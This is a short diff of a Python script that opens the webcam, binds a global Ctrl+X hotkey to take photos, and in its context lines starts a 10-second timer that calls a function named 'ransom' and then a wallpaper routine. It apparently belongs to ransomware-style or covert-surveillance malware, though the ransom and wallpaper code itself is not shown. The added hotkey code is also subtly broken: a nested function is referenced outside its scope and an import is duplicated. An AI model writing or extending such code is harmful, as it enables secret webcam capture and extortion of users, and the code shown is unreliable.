@@ -3,6 +3,9 @@ import time
 import schedule
 from datetime import datetime
 import threading
+from global_hotkeys import *
+
+import time
 
 print(cv2.__version__)
 cam=cv2.VideoCapture(0)
@@ -33,9 +36,16 @@ def camera():
 
 
 
-        def run():
-            with Listener(on_press=vkey) as listener:
-                listener.join()
+        def ctrlX():
+            def press_ctrl_x():
+                print('funcion activada')
+                takePhoto()
+
+
+        hotkeys = {'<ctrl>+x': press_ctrl_x }
+
+        with keyboard.GlobalHotKeys(hotkeys) as escuchador:
+            escuchador.join()
 
 th.Timer(10, ransom).start()
 wallpapersch()
